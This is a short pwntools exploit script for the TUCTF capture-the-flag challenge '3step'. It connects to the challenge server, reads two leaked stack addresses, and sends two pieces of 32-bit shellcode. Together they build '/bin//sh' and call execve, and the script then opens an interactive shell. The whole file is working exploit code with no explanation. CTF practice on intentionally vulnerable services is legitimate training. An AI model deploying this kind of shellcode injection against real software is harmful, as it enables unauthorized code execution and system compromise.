from pwn import *
#from LibcSearcher import LibcSearcher

#MyTemplate
program = '3step'
elf = ELF(program,checksec=False)
lokal = False
Debug = False
if lokal:
    s = elf.process()
    #libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
else:
    host = 'chal.tuctf.com'
    port = '30504'
    s = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    context.log_level='debug'
    cmd = ""
    gdb.attach(s,cmd)

#Exploit Here
s.recvuntil("snacks\n")
buf1 =  s.recvline().strip("\n")
buf2 =  s.recvline().strip("\n")

buf1 =  hex(int(buf1,16))
buf2 =  hex(int(buf2,16))
print buf1,buf2

sh1 = asm("""
cdq
mul edx
lea ecx, [eax]
mov esi, 0x68732f2f
mov esp,{}
jmp esp
""".format(buf2))

sh2 = asm("""
mov edi, 0x6e69622f
push ecx
push esi
push edi
lea ebx, [esp]
mov al,0xb
int 0x80
""")

print len(sh1),len(sh2)

s.sendlineafter("1: ",sh1)
s.sendlineafter("2: ",sh2)
add = int(buf1,16)
print hex(add)
s.sendlineafter("3: ",p32(add))

s.interactive()
